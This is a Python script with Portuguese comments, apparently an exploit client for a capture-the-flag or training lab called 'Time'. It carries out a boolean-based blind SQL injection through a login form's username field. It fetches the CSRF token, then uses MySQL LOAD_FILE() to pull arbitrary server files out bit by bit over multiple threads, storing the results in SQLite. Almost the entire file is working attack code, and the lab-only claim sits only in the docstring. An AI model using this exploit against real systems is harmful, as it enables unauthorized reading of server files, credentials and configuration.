#!/usr/bin/env python3
"""Cliente do desafio Time para o laboratório autorizado.

O alvo precisa ser a aplicação de treinamento correspondente ao write-up.
"""

import argparse
import queue
import sqlite3
import threading
import time
from html.parser import HTMLParser

import requests


class TokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.value = None
        self._hidden = False

    def handle_starttag(self, tag, attrs):
        values = dict(attrs)
        if tag == "input" and values.get("type") == "hidden" and values.get("name") == "_token":
            self._hidden = True
            self.value = values.get("value")


class Database:
    def __init__(self, path):
        self.path = path
        self.lock = threading.Lock()
        with sqlite3.connect(self.path) as db:
            db.execute("CREATE TABLE IF NOT EXISTS files (name TEXT, character TEXT, position INTEGER, UNIQUE(name, position))")
            db.execute("CREATE TABLE IF NOT EXISTS files_size (name TEXT PRIMARY KEY, size INTEGER NOT NULL)")

    def size(self, name):
        with sqlite3.connect(self.path) as db:
            row = db.execute("SELECT size FROM files_size WHERE name = ?", (name,)).fetchone()
            return row[0] if row else 0

    def set_size(self, name, value):
        with self.lock, sqlite3.connect(self.path) as db:
            db.execute("INSERT OR REPLACE INTO files_size(name, size) VALUES (?, ?)", (name, value))

    def has(self, name, position):
        with sqlite3.connect(self.path) as db:
            return db.execute("SELECT 1 FROM files WHERE name = ? AND position = ?", (name, position)).fetchone() is not None

    def put(self, name, character, position):
        with self.lock, sqlite3.connect(self.path) as db:
            db.execute("INSERT OR REPLACE INTO files(name, character, position) VALUES (?, ?, ?)", (name, character, position))

    def read(self, name):
        with sqlite3.connect(self.path) as db:
            return "".join(row[0] for row in db.execute("SELECT character FROM files WHERE name = ? ORDER BY position", (name,)))


class LabClient:
    def __init__(self, url, timeout=10, debug=False):
        if "](" in url or url.startswith("["):
            raise ValueError("URL inválida: use http://IP sem Markdown")
        self.url = url.strip()
        self.timeout = timeout
        self.debug = debug
        self.session = requests.Session()
        self.token = None

    def _request(self, expression):
        if self.token is None:
            response = self.session.get(self.url, timeout=self.timeout)
            if self.debug:
                print("[DEBUG] GET {} -> {}".format(self.url, response.status_code))
            response.raise_for_status()
            parser = TokenParser()
            parser.feed(response.text)
            self.token = parser.value
            if not self.token:
                raise RuntimeError("token CSRF não encontrado na página de login")
            if self.debug:
                print("[DEBUG] CSRF encontrado: sim ({} caracteres)".format(len(self.token)))
        # O write-up envia o corpo como application/x-www-form-urlencoded
        # explícito; manter esse formato evita alterar os sinais '+' e '%'.
        body = "_token={}&username={}--+-&password='--+-".format(
            self.token,
            expression,
        )
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        response = None
        for attempt in range(4):
            try:
                response = self.session.post(
                    self.url,
                    data=body,
                    headers=headers,
                    timeout=self.timeout,
                )
                break
            except requests.RequestException:
                if attempt == 3:
                    raise
                time.sleep(0.5 * (2 ** attempt))
        if self.debug:
            print("[DEBUG] POST {} -> {}".format(self.url, response.status_code))
        if response.status_code >= 400:
            detail = response.text[:1200].replace("\n", " ")
            raise RuntimeError("HTTP {} no POST; resposta: {}".format(response.status_code, detail))
        if self.debug:
            print("[DEBUG] Resposta: {}".format(response.text[:160].replace("\n", " ")))
        return "autorizado" in response.text.lower()

    def byte_at(self, expression):
        bits = []
        for bit in range(7, -1, -1):
            test = "'OR(SELECT+(({}>>{})%261))=1".format(expression, bit)
            bits.append("1" if self._request(test) else "0")
        return int("".join(bits), 2)

    def remote_size(self, path):
        expression = "ASCII(SUBSTRING(CHAR_LENGTH(LOAD_FILE('{}')),1,1))".format(path)
        digits = []
        for position in range(1, 20):
            expression = "ASCII(SUBSTRING(CAST(CHAR_LENGTH(LOAD_FILE('{}')) AS CHAR),{},1))".format(path, position)
            value = self.byte_at(expression)
            if value == 0:
                break
            digits.append(chr(value))
        return int("".join(digits)) if digits else 0

    def character(self, path, position):
        expression = "ASCII(SUBSTRING(LOAD_FILE('{}'),{},1))".format(path, position)
        return chr(self.byte_at(expression))


def main():
    parser = argparse.ArgumentParser(description="Extrator do laboratório Time")
    parser.add_argument("-f", "--file", required=True)
    parser.add_argument("-u", "--url")
    parser.add_argument("-t", "--threads", type=int, default=1)
    parser.add_argument("--database", default="files.db")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()
    if args.threads < 1:
        parser.error("--threads deve ser maior que zero")

    database = Database(args.database)
    if not args.url:
        print(database.read(args.file) or "Arquivo não armazenado")
        return

    client = LabClient(args.url, debug=args.debug)
    length = database.size(args.file) or client.remote_size(args.file)
    database.set_size(args.file, length)
    tasks = queue.Queue()
    for position in range(1, length + 1):
        tasks.put(position)

    def worker():
        while True:
            try:
                position = tasks.get_nowait()
            except queue.Empty:
                return
            try:
                if not database.has(args.file, position):
                    database.put(args.file, client.character(args.file, position), position)
            finally:
                tasks.task_done()

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.threads)]
    for thread in threads:
        thread.start()
    tasks.join()
    print(database.read(args.file))


if __name__ == "__main__":
    main()
